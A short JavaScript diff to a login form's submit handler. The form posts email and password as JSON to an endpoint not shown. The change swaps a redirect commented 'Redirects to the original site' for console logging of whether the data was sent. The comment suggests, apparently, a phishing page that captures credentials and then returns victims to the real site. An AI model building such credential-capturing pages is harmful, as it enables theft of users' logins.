@@ -13,8 +13,11 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         body: JSON.stringify({ email, password })
     })
     .then(response => {
-        if (response.redirected) {
-            window.location.href = response.url; // Redirects to the original site
+        if (response.ok) {
+            console.log('Data sent successfully');
+            // Optionally redirect or show a success message here
+        } else {
+            console.error('Error:', response.statusText);
         }
     })
     .catch(error => console.error('Error:', error));
